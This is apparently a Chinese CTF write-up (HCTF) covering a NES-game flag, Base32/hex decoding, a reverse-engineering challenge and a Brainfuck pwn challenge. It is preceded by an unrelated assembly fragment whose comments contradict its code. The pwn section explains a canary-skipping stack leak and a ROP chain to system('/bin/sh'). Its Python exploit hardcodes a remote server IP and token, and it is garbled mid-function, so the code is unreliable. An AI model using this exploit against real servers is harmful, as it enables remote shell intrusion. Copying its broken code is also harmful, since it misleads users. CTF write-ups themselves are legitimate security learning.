               dw 3
               dd  _start
               dw _start - $$
    _start:        inc ebx                 ; 1 = stdout file descriptor
               add     eax, strict dword 4      ; 4 = write system call number
               mov     ecx, msg         ; Point ecx at string
               mov     dl, 7                ; Set edx to string length
               int  0x80               ; eax = write(ebx, ecx, edx)
               and     eax, 0x10020         ; al = 0 if no error occurred
               xchg    eax, ebx          ; 1 = exit system call number
               int  0x80               ; exit(ebx)
    msg:          db  'coffee', 10
**What Is This**
下载下来发现是个nes文件,用nes模拟器打开发现是《赤色要塞》这款游戏,到网上找了个无敌的金手指很快通关了,但是最后的文字变成了乱码,只好重新通关一次,在最后的时候把金手指删除,成功出现flag:
****
中间有字母被挡住了,可以脑补下是:
FLAGISILOVENESFUCKYOUHCGORSA
**  
**
**送分要不要?(萌新点我)**
发现是个zip压缩文件,由于自己的kali虚拟机炸了,没有用strings查看,被坑了好久,对了压缩包里面的图片撸了好久,发现并没有什么卵用,后来用winhex打开zip,发现里面有个base64的字符串,经过多次解密后得到flag:
GY4DMMZXGQ3DMN2CGZCTMRJTGE3TGNRTGVDDMQZXGM2UMNZTGMYDKRRTGMZTINZTG44TEMJXIQ======
686374667B6E6E3173635F6C735F73305F33347379217D
hctf{nn1sc_ls_s0_34sy!}
**  
**
**逆向**
**友善的逆向**
先nop掉三个移动窗口的消息处理分支。
if ( strlen(&String) == 22 && MyCheckHCTF((int)&String, SBYTE4(v15)) &&
sub_401BB0(&String) )
第一个函数是检查是否开头HCTF{结尾}。第二个函数对输入字节做了一些处理,还好基本仍然是连续的。  
     while ( 1 )
            {
              v7 = dword_4191B0 ^ byte_418217;
              if ( (dword_4191B0 ^ byte_418217) >= 0
                && dword_4191B0 != byte_418217
                && (v7 ^ (char)v15) == byte_418218
                && (v7 ^ SBYTE1(v15)) == byte_418219
                && (v7 ^ SBYTE2(v15)) == byte_41821A
                && (v7 ^ SBYTE3(v15)) == byte_41821B )
                break;
              Sleep(0x14u);
              ++v6;
              if ( v6 >= 100 )
                goto LABEL_28;
            }
如果错误的话,就sleep很长时间,为了方便调试可以把sleep给nop掉。
发现v7可能是0x32,0x2等几种取值。418218到41821B是Ka53。
其中0x2与这几个字节按字节异或得到Ic71。
v8 = dword_4191D8;
dword_4191D8 = dword_4191C0[0];
dword_4191C0[0] = v8;
v9 = dword_4191E0;
dword_4191E0 = dword_4191CC;
dword_4191CC = v9;
v10 = dword_4191D4;
dword_4191D4 = dword_4191C8;
dword_4191C8 = v10;
v11 = dword_4191D0;
dword_4191D0 = dword_4191EC;
v12 = 0;
dword_4191EC = v11;
这里交换了一些输入的字节。
最后与415600处的DWORD数组进行了比较。  
     if ( dword_415600[v12] != dword_4191C0[v12] )
              {
                MessageBoxW(0, L"Try Again", L"Fail", 0);
                exit(-1);
              }
为了方便调试,可以把这里的exit(-1);改成goto LABEL_28;即jmp short loc_401A50
**  
**
**PWN**
**Brainfuck**
向pwn2输入的brainfuck代码会被翻译成c代码然后编译,后来更新题目后缓冲区放到了栈上,降低了难道。
由于brainfuck代码长度有限制,所以我们不能直接通过>移动到rbp。
    while(*p){
    p ++;
    *p = getchar();
    }
以x00为结束标志。在缓冲区最后一个字节填充x00,前面填充任意字节。然后还要>跳过8字节rbp,再>跳过8字节的canary。然后putchar
输出ret地址。
main会返回到__libc_start_main,因此我们可以在[rbp]处leak处__libc_start_main的地址。在我的机器上是在__libc_start_main+240,在远程服务器上尝试出来是__libc_start_main+245。由于leak地址的时候是按字节输出的,可能输出地址高位的时候,已经被进了位,不过可能性较小,可以忽略。
根据libc.so.64计算处system和/bin/sh的VA。现在需要把/bin/sh的地址写进rdi。找到一个gadget。pop rax;pop
rdi;call rax
返回gadget,然后system放到栈后面,接着是/bin/sh。
然后发送cat flag
    import socket
    import struct
    from time import sleep
    def translate(a):
        s = 0L
        for i in range(8):
            x = ord(a[i])
            if s + i >= (0x100L,]'+'>'*16 + '>.'*8 + ','*8 + '>,'*8 + '>,'*8 + ']q'
        if local:
            addr = ('127.0.0.1', 22222)
            sock.connect(addr)
            print control
            sock.send(control)
        else:
            addr = ('120.55.86.95', 22222)
            sock.connect(addr)
            token = 'ad38a9d9daa2a08da38bd6b01a3e0cbe'
            rs(token+'n')
            rs(control)
    else:
        addr = ('127.0.0.1', 22222)
        sock.connect(addr)
    sock.send((0x208-2)*'a'+'x00')
    sleep(1)
    __libc_start_main_p_240 = sock.recv(8)
    __libc_start_main = translate(__libc_start_main_p_240) - 240 - 5
    print '__libc_start_main =', hex(__libc_start_main)
    pop_rax_pop_rdi_call_rax = __libc_start_main + 886441
    system = __libc_start_main + 149616
    bash = __libc_start_main + 1421067
    sock.send(struct.pack("<Q", pop_rax_pop_rdi_call_rax))
    sock.send(struct.pack("<Q", system))
    sock.send(struct.pack("<Q", bash) + 'n')
    sock.send("cat flagn")
    sleep(2)
    print sock.recv(1024)
    print sock.recv(1024)